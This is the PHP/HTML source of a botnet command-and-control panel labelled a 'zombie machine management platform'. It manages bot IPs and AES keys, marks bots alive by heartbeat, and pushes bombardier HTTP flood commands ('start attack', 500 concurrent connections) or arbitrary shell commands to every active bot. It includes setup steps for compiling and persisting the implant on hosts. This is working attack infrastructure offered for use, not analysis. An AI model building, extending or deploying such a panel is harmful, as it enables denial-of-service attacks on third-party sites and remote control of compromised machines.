<?php
include 'panel_login.php';
include 'sql_connect.php';

// --- 將 binary(4) 轉 IPv4 ---
function binaryToIPv4($bin4) {
    $arr = unpack("C4", $bin4);
    return implode(".", $arr);
}

// 讀取 botnet 資料
$sql = "SELECT ip, aes_key, last_alive_time
        FROM botnet
        WHERE is_deleted = 0
        ORDER BY ip ";
$result = mysqli_query($conn, $sql);
?>
<!DOCTYPE html>
<html lang="zh-Hant">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>肉雞管理平臺</title>

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">

<style>
    body { background-color: #f3f4f6; color: #212529; font-family: system-ui, -apple-system, sans-serif; }
    .custom-card { background-color: #ffffff; border: none; }
    .font-mono { font-family: Consolas, Monaco, "Courier New", monospace; }
    #attack-log { max-height: 500px; overflow-y: auto; white-space: pre-wrap; font-size: 14px; }
</style>
</head>

<body>

<div class="container py-5">
    <h1 class="text-center mb-5 fw-bold text-primary tracking-wider">肉雞管理平臺</h1>

    <div class="row justify-content-center">
        <div class="col-lg-10">

            <div class="card custom-card shadow-lg mb-4">
                <div class="card-body p-5">

<!-- ===================== Bombardier 攻擊區域 ===================== -->

<h3 class="mb-3 text-danger fw-bold d-flex justify-content-between align-items-center">
    <span id="attackTitle">Bombardier 壓測發送</span>

    <style>
    #devModeSwitchLabel { color: #666 !important; }
    </style>

<div class="form-check form-switch d-flex align-items-center" style="zoom:1;">
    <input class="form-check-input" type="checkbox" role="switch" id="devModeSwitch">
    <label id="devModeSwitchLabel" class="form-check-label ms-2 small" for="devModeSwitch">開發模式</label>
</div>

</h3>

<!-- =================== 一般模式 =================== -->
<div id="normal-mode">

<form id="attackForm">

    <div class="mb-3">
        <label class="form-label fw-bold d-block">請求方法</label>
        <div class="form-check form-check-inline">
            <input class="form-check-input" type="radio" name="method" id="method-get" value="GET" checked>
            <label class="form-check-label" for="method-get">GET</label>
        </div>
        <div class="form-check form-check-inline">
            <input class="form-check-input" type="radio" name="method" id="method-post" value="POST">
            <label class="form-check-label" for="method-post">POST</label>
        </div>
    </div>

    <div class="row mb-3">
        <div class="col-md-3">
            <label class="form-label fw-bold">並發數 (-c)</label>
            <input type="number" name="c" class="form-control" placeholder="如 555" required value="500">
        </div>

        <div class="col-md-3">
            <label class="form-label fw-bold">持續時間 (-d)</label>
            <input type="text" name="d" class="form-control" placeholder="如 120s" required value="120s">
        </div>

        <div class="col-md-3">
            <label class="form-label fw-bold">User-Agent</label>
            <input type="text" name="ua" class="form-control" placeholder="自訂 UA"
                value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132">
        </div>

        <div class="col-md-3">
            <label class="form-label fw-bold">Timeout (--timeout)</label>
            <input type="text" name="timeout" class="form-control" placeholder="如 20s" value="20s">
        </div>
    </div>

    <div class="mb-3" style="max-width:300px;">
        <label class="form-label fw-bold">HTTP 版本</label>
        <select name="httpver" class="form-select">
            <option value="">自動</option>
            <option value="--http1">HTTP/1.1</option>
            <option value="--http2">HTTP/2</option>
            <option value="--http3">HTTP/3</option>
        </select>
    </div>

    <div class="mb-3" id="post-body-group" style="display:none;">
        <label class="form-label fw-bold">POST Body (-b)</label>
        <input type="text" name="b" class="form-control" placeholder="如 username=abc&pwd=123">
    </div>

    <div class="mb-3">
        <label class="form-label fw-bold">壓測目標 URL</label>
        <input type="text" name="url" class="form-control" placeholder="https://example.com/path" required>
    </div>

    <div class="mb-3">
        <label class="form-label fw-bold">其他 Bombardier 參數（可選）</label>
        <input type="text" name="extra" class="form-control" placeholder="例如 --insecure">
    </div>

    <button class="btn btn-danger px-4 fw-bold" type="submit">
        <i class="bi bi-lightning-charge-fill me-1"></i> 開始攻擊
    </button>

</form>
</div>

<!-- =================== 開發模式 =================== -->
<div id="dev-mode" style="display:none;">

    <label class="form-label fw-bold">請輸入你要下發至每隻肉雞的指令</label>

    <textarea id="devCmd" class="form-control font-mono" rows="4"
        placeholder="例如：bombardier -c 500 -d 10s https://example.com/" >ping 1.1.1.1 -c 6</textarea>

    <button id="devSubmit" class="btn btn-warning mt-3 px-4 fw-bold">
        <i class="bi bi-terminal-dash me-1"></i> 發送指令
    </button>

</div>

<script>
// 開發模式切換
document.getElementById("devModeSwitch").addEventListener("change", function () {
    let dev = this.checked;

    document.getElementById("normal-mode").style.display = dev ? "none" : "block";
    document.getElementById("dev-mode").style.display    = dev ? "block" : "none";

    const titleSpan = document.getElementById("attackTitle");
    titleSpan.textContent = dev ? "群控指令下發" : "Bombardier 壓測發送";
});

// POST Body 顯示切換
function updatePostBodyVisibility() {
    document.getElementById("post-body-group").style.display =
        document.getElementById("method-post").checked ? "block" : "none";
}
document.getElementById("method-get").onchange = updatePostBodyVisibility;
document.getElementById("method-post").onchange = updatePostBodyVisibility;
updatePostBodyVisibility();
</script>

                </div>
            </div>

<!-- ================== 攻擊 Log ================== -->
<pre id="attack-log" class="p-3 bg-dark text-white rounded mb-4" style="display:none;"></pre>

<!-- ================== 肉雞列表 + 添加肉雞表單 ================== -->

<div class="card custom-card shadow-lg">
    <div class="card-body p-5">

        <!-- 添加肉雞表單 -->
        <form action="panel_addrj.php" method="POST" class="mb-4">
            <div class="input-group shadow-sm">
                <input type="text" name="ip"
                    class="form-control form-control-lg border-secondary-subtle"
                    placeholder="輸入 IP 地址 (例如: 192.168.1.1)" required>

                <input type="text" name="key"
                    class="form-control form-control-lg border-secondary-subtle"
                    placeholder="輸入 aes key (HEX)" required>

                <button class="btn btn-primary px-4" type="submit">
                    <i class="bi bi-plus-lg me-2"></i> 添加肉雞
                </button>
            </div>
        </form>

        <div class="table-responsive rounded border border-light-subtle mt-4">
            <table class="table table-hover mb-0">
                <thead class="table-light">
                    <tr>
                        <th class="py-3 ps-4">IP</th>
                        <th class="py-3">最後上線時間</th>
                        <th class="py-3">操作</th>
                    </tr>
                </thead>
                <tbody>

<?php
$bot_js = [];

if ($result && mysqli_num_rows($result) > 0) {

    mysqli_data_seek($result, 0);
    while ($row = mysqli_fetch_assoc($result)) {

        $ip  = binaryToIPv4($row['ip']);
        $key = bin2hex($row['aes_key']);
        $time = $row['last_alive_time'];
if ($time === NULL) {
    $time = "1999-01-01 00:00:00";
}
        $bot_js[] = "{ ip: '$ip', key: '$key' }";

$status_id = str_replace('.', '-', $ip);

echo "
<tr>
    <td class='ps-4 text-primary font-mono fw-bold'>$ip</td>
    <td class='font-mono text-secondary'>
        $time
        <span class='ms-2 badge bg-secondary' id='status-$status_id'>判斷中...</span>
    </td>
    <td>
        <a href='panel_download_rj.c.php?ip=$ip&key=$key'
           class='btn btn-sm btn-outline-secondary'>
            <i class='bi bi-download me-1'></i> 下載配置
        </a>

        <a href='panel_delrj.php?ip=$ip'
           onclick=\"return confirm('確認刪除？')\"
           class='btn btn-sm btn-danger'>
            <i class='bi bi-trash me-1'></i> 刪除
        </a>
    </td>
</tr>";

    }
}
?>

<script>
// 判斷活躍狀態，並建立 ACTIVE_BOTS

window.addEventListener("DOMContentLoaded", function () {
    const rows = document.querySelectorAll("tbody tr");
    let activeList = [];

    rows.forEach(tr => {
        const tds = tr.querySelectorAll("td");
        if (tds.length < 2) return;

        const ipText = tds[0].innerText.trim();
        const timeStr = tds[1].innerText.trim().split("判斷中")[0].trim();

        const statusId = "status-" + ipText.replace(/\./g, "-");
        const badge = document.getElementById(statusId);
        if (!badge) return;

        const lastTime = new Date(timeStr).getTime();
        const now = Date.now();
        const diffMin = (now - lastTime) / 60000;

        if (diffMin <= 5) {
            badge.textContent = "活躍";
            badge.classList.remove("bg-secondary");
            badge.classList.add("bg-success");

            activeList.push(ipText);    // 加入活躍清單
        } else {
            badge.textContent = "離線";
            badge.classList.remove("bg-secondary");
            badge.classList.add("bg-danger");
        }
    });

    // ======== ★ 新增：活躍機器清單 ========
    window.ACTIVE_IPS = activeList;

    // BOT_LIST 來自 PHP，下方會輸出
    window.ACTIVE_BOTS = window.BOT_LIST.filter(b => activeList.includes(b.ip));

});
</script>

                </tbody>
            </table>
        </div>
肉雞5分鐘內無響應心跳包會被判斷為離線。<br>指令只會對活躍肉雞下發。
    </div>
</div>
<pre id="attack-log" class="p-3 bg-dark text-white rounded mb-4" >
安裝編譯套件和screen：
apt update -y
apt install gcc  screen  openssl libssl-dev -y

安裝bombardier ：
wget https://github.com/codesenberg/bombardier/releases/latest/download/bombardier-linux-amd64
chmod +x bombardier-linux-amd64
sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier

上傳受控程式並編譯
gcc rj_x.x.x.x.c -lcrypto -lssl -o rj

使用screen保持運行
screen -S rj
screen -r rj
</pre>

</div>
</div>

<!-- ================== BOT_LIST 注入 JS ================== -->
<script>
window.BOT_LIST = [
<?php echo implode(",", $bot_js); ?>
];
</script>

<!-- ================== 並行攻擊（只對活躍機器） ================== -->

<script>

document.getElementById("attackForm").addEventListener("submit", function(e){
    e.preventDefault();

    const logBox = document.getElementById("attack-log");
    logBox.style.display = "block";
    logBox.textContent = "正在生成指令...\n";

    const form = new FormData(this);

    let cmd = "bombardier";
    cmd += " -c '" + form.get("c") + "'";
    cmd += " -d '" + form.get("d") + "'";
    cmd += " --method='" + form.get("method") + "'";

    if (form.get("ua"))
        cmd += " --header='User-Agent: " + form.get("ua") + "'";

    if (form.get("timeout"))
        cmd += " --timeout='" + form.get("timeout") + "'";

    if (form.get("httpver"))
        cmd += " " + form.get("httpver");

    if (form.get("method") === "POST" && form.get("b"))
        cmd += " -b '" + form.get("b") + "'";

    if (form.get("extra"))
        cmd += " " + form.get("extra");

    cmd += " '" + form.get("url") + "'";

    logBox.textContent += "指令已生成：\n" + cmd + "\n\n";

    // ===== 只下發給活躍機器 =====
    logBox.textContent += `活躍機器：${window.ACTIVE_BOTS.length} 隻，開始下發...\n\n`;

    window.ACTIVE_BOTS.forEach(bot => {

        fetch("panel_attack.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "ip="  + encodeURIComponent(bot.ip)
                + "&key=" + encodeURIComponent(bot.key)
                + "&cmd=" + encodeURIComponent(cmd)
        })
        .then(r => r.text())
        .then(t => { logBox.textContent += t + "\n"; })
        .catch(err => { logBox.textContent += `❌ ${bot.ip} 發送失敗：${err}\n`; });

    });

});

// ================== 開發模式（也只下發活躍） ==================

document.getElementById("devSubmit").addEventListener("click", function(){
    const logBox = document.getElementById("attack-log");
    logBox.style.display = "block";

    const cmd = document.getElementById("devCmd").value.trim();
    if (!cmd) {
        logBox.textContent += "❌ 指令不能為空\n";
        return;
    }

    logBox.textContent += "開發模式：已輸入指令 →\n" + cmd + "\n\n";
    logBox.textContent += `活躍機器：${window.ACTIVE_BOTS.length} 隻，開始下發...\n\n`;

    window.ACTIVE_BOTS.forEach(bot => {

        fetch("panel_attack.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "ip="  + encodeURIComponent(bot.ip)
                + "&key=" + encodeURIComponent(bot.key)
                + "&cmd=" + encodeURIComponent(cmd)
        })
        .then(r => r.text())
        .then(t => { logBox.textContent += t + "\n"; })
        .catch(err => { logBox.textContent += `❌ ${bot.ip} 發送失敗：${err}\n`; });

    });

});
</script>

<script>
// 自動產生 32 bytes (64 hex) AES key
function generateAESKey() {
    let arr = new Uint8Array(32);
    window.crypto.getRandomValues(arr);

    return Array.from(arr)
        .map(b => b.toString(16).padStart(2, "0"))
        .join("");
}

// 頁面載入時填入 AES key
window.addEventListener("DOMContentLoaded", function () {
    const keyInput = document.querySelector("input[name='key']");
    if (keyInput && keyInput.value.trim() === "") {
        keyInput.value = generateAESKey();
    }
});
</script>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>
